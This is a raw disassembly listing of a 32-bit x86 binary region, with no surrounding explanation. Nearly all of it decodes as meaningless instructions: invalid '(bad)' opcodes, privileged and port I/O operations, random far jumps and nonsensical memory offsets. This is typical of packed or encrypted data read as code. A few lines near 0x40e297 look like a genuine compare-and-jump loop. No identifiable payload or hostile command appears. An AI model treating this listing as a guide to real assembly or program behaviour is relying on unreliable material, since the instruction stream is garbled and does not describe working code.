  40deae:	jp     0x40de39
  40deb0:	cmp    edx,DWORD PTR [esi]
  40deb2:	jg     0x40df2c
  40deb4:	pop    edi
  40deb5:	stos   BYTE PTR es:[edi],al
  40deb6:	popf   
  40deb7:	(bad)  
  40deb8:	inc    BYTE PTR ds:0x361377ed
  40debe:	mov    edi,0x3c4a3bb1
  40dec3:	pop    es
  40dec4:	add    al,0xb6
  40dec6:	sti    
  40dec7:	loope  0x40deea
  40dec9:	pushf  
  40deca:	xchg   esp,eax
  40decb:	ds stos BYTE PTR es:[edi],al
  40decd:	leave  
  40dece:	dec    ebx
  40decf:	imul   esi,DWORD PTR [ebp-0x49],0xffffff99
  40ded3:	int    0x13
  40ded5:	xor    DWORD PTR [edx-0x3e],ebx
  40ded8:	es lahf 
  40deda:	pop    es
  40dedb:	out    dx,eax
  40dedc:	add    edi,DWORD PTR [esi+eiz*1+0x26]
  40dee0:	cwde   
  40dee1:	leave  
  40dee2:	add    bh,BYTE PTR ds:0xb7229041
  40dee8:	ret    0xc4f6
  40deeb:	mov    ah,ch
  40deed:	daa    
  40deee:	ret    0x8bf1
  40def1:	add    eax,DWORD PTR [edi]
  40def3:	or     ebx,DWORD PTR [ecx+0x4c]
  40def6:	icebp  
  40def7:	ret    0x3f87
  40defa:	int    0x72
  40defc:	sahf   
  40defd:	push   cs
  40defe:	test   eax,0x48423497
  40df03:	sbb    ebx,DWORD PTR [ebx-0x3f]
  40df06:	jne    0x40df21
  40df08:	mov    eax,ss
  40df0a:	fist   DWORD PTR [ecx+0x10]
  40df0d:	and    ecx,DWORD PTR [esi+0x211de0d8]
  40df13:	sub    ah,BYTE PTR [esi]
  40df15:	sar    BYTE PTR [esi+0x5394b67d],0x79
  40df1c:	dec    DWORD PTR [eax-0x3224a149]
  40df22:	add    BYTE PTR [ebx-0x27d3e91d],al
  40df28:	inc    esp
  40df29:	mov    ebx,0x9e180992
  40df2e:	test   al,0x1
  40df30:	cmp    DWORD PTR [esi+eiz*8-0x262714d8],esi
  40df37:	xor    edi,edi
  40df39:	dec    eax
  40df3a:	adc    BYTE PTR [edi-0x51af3f36],dl
  40df40:	or     dh,BYTE PTR [ebx-0x12]
  40df43:	in     al,0x22
  40df45:	rcr    DWORD PTR [edi+0x5b],1
  40df48:	out    dx,al
  40df49:	aaa    
  40df4a:	test   eax,0xf4765a84
  40df4f:	cmp    eax,0x49a1bf50
  40df54:	fidiv  WORD PTR [ebx+0x22a1bd44]
  40df5a:	mov    dh,0xee
  40df5c:	pop    ss
  40df5d:	outs   dx,BYTE PTR ds:[esi]
  40df5e:	push   esi
  40df5f:	js     0x40df40
  40df61:	and    al,0x17
  40df63:	dec    eax
  40df64:	push   ebx
  40df65:	fsub   st(5),st
  40df67:	js     0x40df02
  40df69:	mov    ds:0x29737ceb,al
  40df6e:	inc    esp
  40df6f:	rcl    DWORD PTR [eax],cl
  40df71:	mov    WORD PTR [esi-0x30],es
  40df74:	inc    ecx
  40df75:	sub    BYTE PTR [edx+0x74b1a9f2],bl
  40df7b:	xor    DWORD PTR [edx],ebp
  40df7d:	outs   dx,BYTE PTR ds:[esi]
  40df7e:	test   DWORD PTR [ebp-0x73],edi
  40df81:	pop    edx
  40df82:	cli    
  40df83:	mov    ds:0x17fee0f1,eax
  40df88:	push   edx
  40df89:	dec    ebx
  40df8a:	call   0xee8025ac
  40df8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df90:	cmp    ebp,DWORD PTR [ebp+0xa]
  40df93:	push   0xffffffd6
  40df95:	push   ss
  40df96:	les    edi,FWORD PTR [ecx]
  40df98:	mov    dh,BYTE PTR [edi+0x5d]
  40df9b:	pop    ss
  40df9c:	mov    WORD PTR [ecx],cs
  40df9e:	push   ebx
  40df9f:	jecxz  0x40dfe5
  40dfa1:	jae    0x40dfcd
  40dfa3:	cs std 
  40dfa5:	xchg   esp,eax
  40dfa6:	in     al,dx
  40dfa7:	pop    esp
  40dfa8:	mov    ch,0x2c
  40dfaa:	inc    eax
  40dfab:	xor    esp,ecx
  40dfad:	loopne 0x40e017
  40dfaf:	ret    0x2b8c
  40dfb2:	sub    al,bl
  40dfb4:	dec    sp
  40dfb6:	sti    
  40dfb7:	xor    al,0xa0
  40dfb9:	pop    ecx
  40dfba:	popf   
  40dfbb:	sub    DWORD PTR [edx+0x2],edx
  40dfbe:	ret    
  40dfbf:	add    eax,0xb384f98a
  40dfc4:	in     al,dx
  40dfc5:	mov    eax,0xf0000697
  40dfca:	lock retf 
  40dfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfcd:	(bad)  
  40dfce:	pusha  
  40dfcf:	push   es
  40dfd0:	repz push 0x4fb4b171
  40dfd6:	aas    
  40dfd7:	pop    eax
  40dfd8:	ins    BYTE PTR es:[edi],dx
  40dfd9:	lea    eax,[ebx]
  40dfdb:	add    bl,ah
  40dfdd:	shl    dh,cl
  40dfdf:	out    dx,al
  40dfe0:	xchg   esi,eax
  40dfe1:	xor    bh,BYTE PTR [eax]
  40dfe3:	hlt    
  40dfe4:	push   ecx
  40dfe5:	jl     0x40e012
  40dfe7:	jmp    0xbaa7:0xb98c3406
  40dfee:	sub    al,0x67
  40dff0:	pop    ss
  40dff1:	push   ebx
  40dff2:	jmp    0x48fa:0x31d61d0c
  40dff9:	inc    esp
  40dffa:	cmp    DWORD PTR [esi],ebx
  40dffc:	sahf   
  40dffd:	push   0xc444354b
  40e002:	imul   edx,DWORD PTR [ebp-0x1df7c80d],0x6f
  40e009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e00a:	scas   eax,DWORD PTR es:[edi]
  40e00b:	and    BYTE PTR [ebx],bh
  40e00d:	push   edx
  40e00e:	pop    es
  40e00f:	pop    ecx
  40e010:	pop    eax
  40e011:	in     al,0x14
  40e013:	pushf  
  40e014:	nop
  40e015:	cmp    al,0xe0
  40e017:	stc    
  40e018:	push   eax
  40e019:	jb     0x40dfda
  40e01b:	retf   0x76d0
  40e01e:	sbb    edi,esp
  40e020:	jmp    0xbb07:0x950d41a1
  40e027:	and    al,0x6d
  40e029:	bound  esp,QWORD PTR [ebx]
  40e02b:	push   ss
  40e02c:	sbb    BYTE PTR [ebx+0x61bfddcf],cl
  40e032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e033:	aad    0x32
  40e035:	xchg   BYTE PTR [edx+0x510f90bd],dl
  40e03b:	std    
  40e03c:	jle    0x40e00b
  40e03e:	(bad)  
  40e03f:	lds    eax,FWORD PTR [ebx]
  40e041:	xlat   BYTE PTR ds:[ebx]
  40e042:	ja     0x40dfe6
  40e044:	cld    
  40e045:	mov    esp,0x7ec53de
  40e04a:	mov    esi,0xb57c258d
  40e04f:	xchg   dl,ch
  40e051:	lea    esi,ds:0xb4a67fb8
  40e057:	fistp  WORD PTR [ebx-0x3a]
  40e05a:	imul   eax,esi,0x28
  40e05d:	jb     0x40e03a
  40e05f:	xchg   esi,ecx
  40e061:	retf   0x342f
  40e064:	sar    DWORD PTR [esi-0x63d632bd],1
  40e06a:	push   esp
  40e06b:	lods   al,BYTE PTR ds:[esi]
  40e06c:	sub    eax,0x45f76077
  40e071:	push   ecx
  40e072:	adc    edx,DWORD PTR [edi+eax*2-0x705b9f19]
  40e079:	stc    
  40e07a:	cwde   
  40e07b:	pop    eax
  40e07c:	mov    esp,0x73921419
  40e081:	cli    
  40e082:	test   eax,0xb240850
  40e087:	ins    BYTE PTR es:[edi],dx
  40e088:	mov    eax,ds:0x999db1cb
  40e08d:	pop    ecx
  40e08e:	adc    DWORD PTR [ebp+0xe],ecx
  40e091:	lods   al,BYTE PTR ds:[esi]
  40e092:	sbb    cl,0x58
  40e095:	push   edi
  40e096:	xchg   esi,eax
  40e097:	sub    BYTE PTR [edi],bh
  40e099:	daa    
  40e09a:	inc    esp
  40e09b:	mov    ds:0xc282f42c,al
  40e0a0:	in     al,0x9c
  40e0a2:	or     ah,BYTE PTR [ecx]
  40e0a4:	xor    ch,dl
  40e0a6:	outs   dx,BYTE PTR ds:[esi]
  40e0a7:	and    eax,0x5f33fbae
  40e0ac:	sub    DWORD PTR [ebx+0x7a],edx
  40e0af:	(bad)  
  40e0b0:	mov    edi,0xab829c48
  40e0b5:	hlt    
  40e0b6:	sbb    eax,0xd17a8670
  40e0bb:	hlt    
  40e0bc:	mov    cl,0x5b
  40e0be:	in     al,dx
  40e0bf:	xor    eax,0x43745560
  40e0c4:	mov    bh,0xa9
  40e0c6:	int3   
  40e0c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0c8:	xor    eax,0xcee19583
  40e0cd:	xlat   BYTE PTR ds:[ebx]
  40e0ce:	mov    bh,0x62
  40e0d0:	mov    ebp,0x73870540
  40e0d5:	ins    DWORD PTR es:[edi],dx
  40e0d6:	pop    ebx
  40e0d7:	pop    ebx
  40e0d8:	stc    
  40e0d9:	push   ss
  40e0da:	adc    dh,dl
  40e0dc:	dec    esi
  40e0dd:	imul   ecx,DWORD PTR [ecx+eax*8],0x6e5d9076
  40e0e4:	iret   
  40e0e5:	xchg   ecx,eax
  40e0e6:	inc    ebp
  40e0e7:	sbb    al,0x9a
  40e0e9:	xlat   BYTE PTR ds:[ebx]
  40e0ea:	(bad)  
  40e0eb:	push   esp
  40e0ec:	adc    eax,eax
  40e0ee:	mov    dh,0x26
  40e0f0:	mov    ds:0x74e3f9b3,al
  40e0f5:	pushf  
  40e0f6:	into   
  40e0f7:	pushf  
  40e0f8:	int3   
  40e0f9:	and    edi,DWORD PTR es:[eax+0x1f]
  40e0fd:	xor    eax,0x623f1cbe
  40e102:	mov    cl,al
  40e104:	lock inc esi
  40e106:	jp     0x40e0f1
  40e108:	(bad)  
  40e109:	xor    DWORD PTR [ebp+0x18ea7a0c],ecx
  40e10f:	mov    ecx,0x6575abed
  40e114:	mov    ?,WORD PTR [eax+0x104ee2ad]
  40e11a:	daa    
  40e11b:	fs clc 
  40e11d:	lods   al,BYTE PTR ds:[esi]
  40e11e:	sub    eax,0x49dd2acd
  40e123:	out    dx,eax
  40e124:	mov    dl,0xac
  40e126:	ja     0x40e0f8
  40e128:	loop   0x40e1a3
  40e12a:	xchg   ecx,eax
  40e12b:	jg     0x40e0fd
  40e12d:	sub    al,BYTE PTR [ecx]
  40e12f:	shrd   DWORD PTR [ebx-0x5f],ebp,0xcc
  40e134:	mov    cl,0x51
  40e136:	fs leave 
  40e138:	jmp    0x7c8b888b
  40e13d:	pop    edx
  40e13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13f:	mov    dh,0xe
  40e141:	or     ebx,ebx
  40e143:	dec    edx
  40e144:	push   0x57
  40e146:	test   al,0x81
  40e148:	pop    ss
  40e149:	and    edi,DWORD PTR [eax-0xb9644c2]
  40e14f:	ins    BYTE PTR es:[edi],dx
  40e150:	(bad)  
  40e151:	test   eax,0x2cba72c3
  40e156:	jo     0x40e176
  40e158:	ja     0x40e12b
  40e15a:	mov    ds:0x27c1f026,eax
  40e15f:	scas   al,BYTE PTR es:[edi]
  40e160:	inc    eax
  40e161:	pop    ds
  40e162:	sbb    BYTE PTR [edx-0x2b1ef5cc],dh
  40e168:	xor    eax,0xa904c00e
  40e16d:	cs scas eax,DWORD PTR es:[edi]
  40e16f:	jb     0x40e1c4
  40e171:	dec    ebp
  40e172:	cli    
  40e173:	jmp    0x82fc885
  40e178:	hlt    
  40e179:	fsubp  st(4),st
  40e17b:	mov    edx,0x83675be9
  40e180:	add    bh,bh
  40e182:	add    BYTE PTR [ebp+0x6ad44f86],dl
  40e188:	mov    eax,ds:0x4167bb96
  40e18d:	sub    al,0xa6
  40e18f:	xor    BYTE PTR [edx],ah
  40e191:	bswap  eax
  40e193:	mov    cl,bl
  40e195:	into   
  40e196:	mov    dh,0xaa
  40e198:	inc    si
  40e19a:	retf   
  40e19b:	jne    0x40e1a9
  40e19d:	sbb    bl,BYTE PTR [ecx+0x29]
  40e1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a1:	aam    0x58
  40e1a3:	xchg   edi,eax
  40e1a4:	sahf   
  40e1a5:	out    0x6f,al
  40e1a7:	mov    ah,0x74
  40e1a9:	push   es
  40e1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ab:	mov    dh,0xf8
  40e1ad:	adc    eax,0x6b19e62
  40e1b2:	stc    
  40e1b3:	cs xchg esp,eax
  40e1b5:	add    ebx,DWORD PTR [edi]
  40e1b7:	jbe    0x40e16a
  40e1b9:	aad    0x1d
  40e1bb:	inc    ecx
  40e1bc:	push   es
  40e1bd:	int    0x61
  40e1bf:	outs   dx,BYTE PTR ss:[esi]
  40e1c1:	inc    ebx
  40e1c2:	push   eax
  40e1c3:	xchg   ecx,eax
  40e1c4:	test   al,0x65
  40e1c6:	adc    ch,dl
  40e1c8:	call   0xa786:0xf6b1f7ea
  40e1cf:	push   esi
  40e1d0:	sbb    cl,BYTE PTR [esi]
  40e1d2:	jbe    0x40e1ab
  40e1d4:	inc    ecx
  40e1d5:	test   eax,0x96bb5ab1
  40e1da:	(bad)  
  40e1db:	lds    eax,FWORD PTR [ebx-0x178426c4]
  40e1e1:	imul   edx,DWORD PTR [edx+0x31],0xbda3fefa
  40e1e8:	jb     0x40e259
  40e1ea:	sub    eax,0xc8d8c3ea
  40e1ef:	invd   
  40e1f1:	sub    eax,ebp
  40e1f3:	xor    eax,0xd1adf55d
  40e1f8:	push   cs
  40e1f9:	(bad)  
  40e1fa:	xchg   edi,eax
  40e1fb:	arpl   WORD PTR [edi],bx
  40e1fd:	(bad)  
  40e1fe:	sbb    ch,BYTE PTR [edi-0x6e474b88]
  40e204:	and    DWORD PTR [eax-0x46135ec5],esi
  40e20a:	push   edx
  40e20b:	sar    DWORD PTR [edi],cl
  40e20d:	sbb    esp,DWORD PTR [edx+0x7]
  40e210:	push   edx
  40e211:	out    0xbf,al
  40e213:	aas    
  40e214:	ins    BYTE PTR es:[edi],dx
  40e215:	data16 mov bh,bl
  40e218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e219:	je     0x40e1e7
  40e21b:	xor    esp,DWORD PTR [ebx-0x18]
  40e21e:	ja     0x40e1b8
  40e220:	and    al,0x6f
  40e222:	fstp   DWORD PTR [eax]
  40e224:	mov    dh,0x96
  40e226:	int3   
  40e227:	add    edx,edx
  40e229:	rcl    BYTE PTR [ecx+0x6b],cl
  40e22c:	push   edx
  40e22d:	push   0xb7361ab2
  40e232:	repnz outs dx,DWORD PTR ds:[esi]
  40e234:	ss and eax,0x677135eb
  40e23a:	aad    0x15
  40e23c:	test   eax,0x54857691
  40e241:	xor    edi,DWORD PTR [ebx]
  40e243:	setge  BYTE PTR [ebp-0x15]
  40e247:	fisubr WORD PTR [edx+0x50cf6709]
  40e24d:	push   edi
  40e24e:	cmp    esp,ecx
  40e250:	leave  
  40e251:	(bad)  
  40e252:	mov    bh,0x83
  40e254:	mov    ds:0x687a27ed,al
  40e259:	ds pop ss
  40e25b:	dec    esp
  40e25c:	ret    0x15bd
  40e25f:	sti    
  40e260:	pop    edx
  40e261:	xchg   edx,eax
  40e262:	xlat   BYTE PTR ds:[ebx]
  40e263:	push   edx
  40e264:	mov    ebx,0x5bd14ce2
  40e269:	inc    ecx
  40e26a:	arpl   WORD PTR [edi-0x76],si
  40e26d:	mov    edx,0x946b6792
  40e272:	sbb    dh,dl
  40e274:	clc    
  40e275:	scas   al,BYTE PTR es:[edi]
  40e276:	push   0x3b
  40e278:	add    eax,esp
  40e27a:	test   al,0xc0
  40e27c:	push   ds
  40e27d:	leave  
  40e27e:	call   DWORD PTR [esi+0x64]
  40e281:	rcl    eax,cl
  40e283:	inc    edi
  40e284:	ds pop ss
  40e286:	xchg   ecx,eax
  40e287:	rol    edx,0x61
  40e28a:	inc    eax
  40e28b:	(bad)  
  40e28d:	jge    0x40e29a
  40e28f:	ins    BYTE PTR es:[edi],dx
  40e290:	pop    ebp
  40e291:	sar    dl,0xec
  40e294:	in     eax,dx
  40e295:	jmp    0x40e2d8
  40e297:	sub    edi,edx
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0xff5e5ddc
  40e2c4:	test   al,0xfb
  40e2c6:	adc    ebp,DWORD PTR [esi]
  40e2c8:	stos   BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	retf   0x4f10
  40e2d2:	sub    bl,al
  40e2d4:	leave  
  40e2d5:	xchg   DWORD PTR [esi-0x4c8125b7],eax
  40e2db:	outs   dx,BYTE PTR ds:[esi]
  40e2dc:	repz mov al,0x82
  40e2df:	fcmovbe st,st(1)
  40e2e1:	add    eax,0x5e1cd86c
  40e2e6:	mov    bl,0x98
  40e2e8:	or     al,BYTE PTR [esi-0x4a]
  40e2eb:	fwait
  40e2ec:	jns    0x40e2ae
  40e2ee:	mov    bh,0xb9
  40e2f0:	repnz adc esp,DWORD PTR [eax+0x11]
  40e2f4:	pop    edx
  40e2f5:	add    eax,0xdd9eaba3
  40e2fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2fb:	addr16 out 0x51,eax
  40e2fe:	jle    0x40e32b
  40e300:	loop   0x40e2ed
  40e302:	bound  esp,QWORD PTR [esi+0x59]
  40e305:	dec    esp
  40e306:	inc    esp
  40e307:	cmp    eax,0x7da06d8c
  40e30c:	fucom  st(3)
  40e30e:	sbb    ebx,DWORD PTR [esi-0x27]
  40e311:	cli    
  40e312:	sub    eax,0xa49168bf
  40e317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e318:	rcr    BYTE PTR [ebx+0x74],cl
  40e31b:	sbb    ah,BYTE PTR [ebx]
  40e31d:	add    ax,0xd5e0
  40e321:	xor    DWORD PTR [ebx+0x2f],esi
  40e324:	in     al,0xec
  40e326:	and    eax,0x3016bf36
  40e32b:	in     al,dx
  40e32c:	push   es
  40e32d:	stos   DWORD PTR es:[edi],eax
  40e32e:	fldenv [ecx+0x4e6645ca]
  40e334:	jo     0x40e2cc
  40e336:	cmc    
  40e337:	sbb    eax,0xc540ba07
  40e33c:	pop    ebx
  40e33d:	jmp    0x40e2f9
  40e33f:	cmp    BYTE PTR [edi],bh
  40e341:	shr    bl,cl
  40e343:	stos   DWORD PTR es:[edi],eax
  40e344:	retf   0x8d96
  40e347:	xchg   esp,eax
  40e348:	cmp    ebp,edi
  40e34a:	gs fwait
  40e34c:	mov    dl,0xd
  40e34e:	jl     0x40e2e1
  40e350:	test   edx,ebx
  40e352:	jb     0x40e30a
  40e354:	shr    BYTE PTR [edx+ebx*2],1
  40e357:	and    eax,0xf10f68b5
  40e35c:	xchg   BYTE PTR [edi-0x29e3c3a1],cl
  40e362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e363:	les    ebx,FWORD PTR [ecx-0x61afae31]
  40e369:	jno    0x40e315
  40e36b:	in     al,0x46
  40e36d:	outs   dx,DWORD PTR ds:[esi]
  40e36e:	mov    esi,0x7006e9e0
  40e373:	dec    ecx
  40e374:	push   DWORD PTR [edx]
  40e376:	cmp    DWORD PTR [ebp-0x610940cd],eax
  40e37c:	call   0x44f9:0x5d59baf3
  40e383:	in     eax,0xc7
  40e385:	cmp    ebx,DWORD PTR [esi]
  40e387:	fidiv  WORD PTR [ebp-0x41]
  40e38a:	fxch   st(5)
  40e38c:	sti    
  40e38d:	les    esp,FWORD PTR [edi+0x79e4ba1f]
  40e393:	leave  
  40e394:	mov    dh,0x57
  40e396:	inc    esp
  40e397:	pop    esi
  40e398:	add    dl,ah
  40e39a:	inc    ecx
  40e39b:	inc    esp
  40e39c:	mov    BYTE PTR [ecx+0x1c],0x26
  40e3a0:	leave  
  40e3a1:	cmp    DWORD PTR [edi],esi
  40e3a3:	sti    
  40e3a4:	mov    esi,0x9fb12f28
  40e3a9:	pop    esp
  40e3aa:	ins    BYTE PTR es:[edi],dx
  40e3ab:	jb     0x40e403
  40e3ad:	mov    esp,0x23c1a56
  40e3b2:	jge    0x40e3e5
  40e3b4:	jnp    0x40e342
  40e3b6:	push   eax
  40e3b7:	sub    eax,0xa86bb132
  40e3bc:	mov    eax,ds:0xb57f070a
  40e3c1:	data16 cmp BYTE PTR [ecx-0x32ebd62e],cl
  40e3c8:	inc    ecx
  40e3c9:	sbb    DWORD PTR [edi],esp
  40e3cb:	jns    0x40e44a
  40e3cd:	fwait
  40e3ce:	mov    esi,0x4d47a112
  40e3d3:	cdq    
  40e3d4:	bound  edx,QWORD PTR [ecx]
  40e3d6:	add    DWORD PTR [ebx+0x28],0x368b307e
  40e3dd:	xchg   ebx,eax
  40e3de:	jne    0x40e372
  40e3e0:	jo     0x40e3da
  40e3e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3e3:	xor    al,0x4c
  40e3e5:	in     al,dx
  40e3e6:	mov    ds:0xcc9cb615,eax
  40e3eb:	retf   0x937
  40e3ee:	iret   
  40e3ef:	rcl    BYTE PTR [ebx-0x38c7d3e1],1
  40e3f5:	lock jb 0x40e3c2
  40e3f8:	shl    BYTE PTR [ebx-0x20025139],1
  40e3fe:	sbb    ecx,eax
  40e400:	jmp    0xaff6:0xdf568d14
  40e407:	push   esi
  40e408:	out    dx,eax
  40e409:	mov    ah,0x99
  40e40b:	pop    ds
  40e40c:	mov    ebx,0x877864ee
  40e411:	mov    bl,0xaf
  40e413:	test   al,0xd6
  40e415:	les    eax,FWORD PTR [ebp+0x54]
  40e418:	fild   QWORD PTR [ecx+eax*8-0x37]
  40e41c:	push   cs
  40e41d:	cdq    
  40e41e:	std    
  40e41f:	js     0x40e3fc
  40e421:	dec    edx
  40e422:	mov    eax,0x7560c6db
  40e427:	data16 loop 0x40e428
  40e42a:	ror    DWORD PTR [edx],0xb9
  40e42d:	stos   DWORD PTR es:[edi],eax
  40e42e:	les    esp,FWORD PTR [ebp+0xf]
  40e431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e432:	sbb    DWORD PTR [esi],ebp
  40e434:	rcl    DWORD PTR [esi-0x324413f2],cl
  40e43a:	jae    0x40e447
  40e43c:	retf   
  40e43d:	pop    ss
  40e43e:	jne    0x40e3f8
  40e440:	(bad)  
  40e441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e442:	xor    al,0xae
  40e444:	repz jl 0x40e4a5
  40e447:	scas   eax,DWORD PTR es:[edi]
  40e448:	stos   DWORD PTR es:[edi],eax
  40e449:	shl    ebx,1
  40e44b:	loopne 0x40e444
  40e44d:	and    al,0x70
  40e44f:	jo     0x40e46d
  40e451:	xchg   ebp,eax
  40e452:	ror    DWORD PTR [edx+0x7777e40d],0xa
  40e459:	fisub  DWORD PTR [edx-0x28]
  40e45c:	sbb    ebx,DWORD PTR [eax-0x63]
  40e45f:	push   0x9dbb95cc
  40e464:	push   0x82eb2f07
  40e469:	or     eax,0xe70e5c4d
  40e46e:	xchg   edi,eax
  40e46f:	cmp    BYTE PTR [ebp+0xebdb6a1],0x24
  40e476:	in     eax,dx
  40e477:	lods   al,BYTE PTR ds:[esi]
  40e478:	pop    eax
  40e479:	jns    0x40e43f
  40e47b:	inc    BYTE PTR [esi+ecx*1+0x2cb7184c]
  40e482:	out    dx,eax
  40e483:	add    DWORD PTR [ebx+0x4c87e207],edx
  40e489:	push   0x83fa719a
  40e48e:	mov    edi,0x8039b455
  40e493:	in     al,dx
  40e494:	loopne 0x40e497
  40e496:	cld    
  40e497:	adc    DWORD PTR [edi],ebp
  40e499:	push   ds
  40e49a:	jmp    0x40e4a0
  40e49c:	xor    al,0xf7
  40e49e:	sbb    bh,BYTE PTR fs:[edi+0x9a069c0]
  40e4a5:	out    dx,al
  40e4a6:	mov    ?,WORD PTR [eax+edx*1+0x1c]
  40e4aa:	jle    0x40e4b3
  40e4ac:	nop
  40e4ad:	lods   eax,DWORD PTR ds:[esi]
  40e4ae:	jmp    0x701325a4
  40e4b3:	xor    eax,0xae4b32ec
  40e4b8:	push   esi
  40e4b9:	jno    0x40e534
  40e4bb:	aas    
  40e4bc:	iret   
  40e4bd:	mov    esp,0xb0e480e7
  40e4c2:	mov    eax,ds:0x1a259c1
  40e4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4c8:	aad    0x57
  40e4ca:	jge    0x40e463
  40e4cc:	adc    DWORD PTR [esi],ecx
  40e4ce:	in     eax,0xd9
  40e4d0:	sbb    BYTE PTR [ebp+esi*2+0x26],dl
  40e4d4:	bnd jae 0x40e497
  40e4d7:	mov    esp,0x639079da
  40e4dc:	jmp    FWORD PTR [edx-0x6a]
  40e4df:	sub    ebp,DWORD PTR [edx-0x16]
  40e4e2:	test   DWORD PTR [ecx-0x11],ebx
  40e4e5:	bound  edx,QWORD PTR [ebx+0x77]
  40e4e8:	inc    ebx
  40e4e9:	xor    eax,DWORD PTR [esp+ebx*2+0x57]
  40e4ed:	cmp    ah,dh
  40e4ef:	add    DWORD PTR ds:0x1d2e5c29,esi
  40e4f5:	jl     0x40e52b
  40e4f7:	push   ss
  40e4f8:	add    bl,BYTE PTR [ebp+edi*1-0x1fe536da]
  40e4ff:	mov    bh,0xbd
  40e501:	shl    DWORD PTR [ebx],0x21
  40e504:	adc    BYTE PTR [ebp+eiz*2+0x1debf754],0x7a
  40e50c:	pop    ds
  40e50d:	xlat   BYTE PTR ds:[ebx]
  40e50e:	lahf   
  40e50f:	and    BYTE PTR [eax+0xf10da04],bl
  40e515:	jp     0x40e565
  40e517:	ror    BYTE PTR ds:0x5fc46498,1
  40e51d:	ins    DWORD PTR es:[edi],dx
  40e51e:	jg     0x40e548
  40e520:	xor    eax,0x1a55bda6
  40e525:	scas   eax,DWORD PTR es:[edi]
  40e526:	sub    ebp,DWORD PTR [ecx-0x138cd446]
  40e52c:	sbb    DWORD PTR [ecx+0x38],edi
  40e52f:	and    DWORD PTR ds:0x5d8bb7aa,0x3f
  40e536:	imul   ecx,DWORD PTR [esi],0xffffffa0
  40e539:	push   cs
  40e53a:	mov    ebx,0x667be7d6
  40e53f:	and    edi,DWORD PTR [ecx-0x74cf50d4]
  40e545:	les    edi,FWORD PTR [ebx]
  40e547:	inc    ecx
  40e548:	mov    eax,0x286e7db9
  40e54d:	push   ds
  40e54e:	pop    ss
  40e54f:	icebp  
  40e550:	sbb    al,0x2d
  40e552:	mov    esp,0x95e8b60c
  40e557:	inc    BYTE PTR [ebx]
  40e559:	xor    bh,BYTE PTR [ebx+eax*2]
  40e55c:	gs push ds
  40e55e:	out    0x4,eax
  40e560:	lds    eax,FWORD PTR [ebx]
  40e562:	(bad)  
  40e564:	xchg   edx,eax
  40e565:	dec    ecx
  40e566:	sub    ebp,DWORD PTR [edx+0x3d]
  40e569:	add    esi,DWORD PTR [ebp+0x54]
  40e56c:	cli    
  40e56d:	xchg   ecx,eax
  40e56e:	cmp    DWORD PTR [edx],0xcc7c7627
  40e574:	dec    esi
  40e575:	mov    ebp,0x56b1249f
  40e57a:	xchg   DWORD PTR [ecx-0x32],edi
  40e57d:	lds    ebx,FWORD PTR [edx-0x6551f2df]
  40e583:	ja     0x40e519
  40e585:	jmp    0xc1cb26ff
  40e58a:	xor    DWORD PTR [ebp+0x29d41f90],eax
  40e590:	pop    DWORD PTR [esi-0x6d]
  40e593:	test   eax,0xa064e1e7
  40e598:	jne    0x40e617
  40e59a:	jbe    0x40e57e
  40e59c:	imul   esi,esp,0x65
  40e59f:	cld    
  40e5a0:	adc    DWORD PTR [ebp-0xdc1b737],esi
  40e5a6:	inc    esp
  40e5a7:	jnp    0x40e5be
  40e5a9:	push   edx
  40e5aa:	push   ds
  40e5ab:	sub    BYTE PTR [ecx+ebx*1],bh
  40e5ae:	and    BYTE PTR [ebp-0x4c],bh
  40e5b1:	dec    edx
  40e5b2:	push   edi
  40e5b3:	jp     0x40e5bb
  40e5b5:	nop
  40e5b6:	repz cmp esp,ecx
  40e5b9:	mov    ch,0xf8
  40e5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5bc:	xor    eax,edi
  40e5be:	sahf   
  40e5bf:	inc    ebp
  40e5c0:	jge    0x40e5de
  40e5c2:	aas    
  40e5c3:	sbb    eax,0xd548a82b
  40e5c8:	data16 xor al,bh
  40e5cb:	stc    
  40e5cc:	fs aam 0x68
  40e5cf:	pop    esi
  40e5d0:	lds    esi,FWORD PTR [eax-0x3cf3d84b]
  40e5d6:	rol    bl,0xec
  40e5d9:	push   edi
  40e5da:	add    esp,DWORD PTR [ebx+ebx*4]
  40e5dd:	(bad)  
  40e5df:	xor    al,0x5b
  40e5e1:	dec    edx
  40e5e2:	leave  
  40e5e3:	push   DWORD PTR ds:0x8b6bc8e1
  40e5e9:	dec    ebx
  40e5ea:	jmp    0x5fe9:0x6cd77653
  40e5f1:	sbb    eax,0x5a1e61c4
  40e5f6:	dec    eax
  40e5f7:	xor    BYTE PTR [ecx-0x72],dl
  40e5fa:	or     BYTE PTR [esi+eiz*8+0x13],cl
  40e5fe:	jne    0x40e5e0
  40e600:	mov    esp,DWORD PTR [edx]
  40e602:	mov    DWORD PTR [edi+0x49075c94],ecx
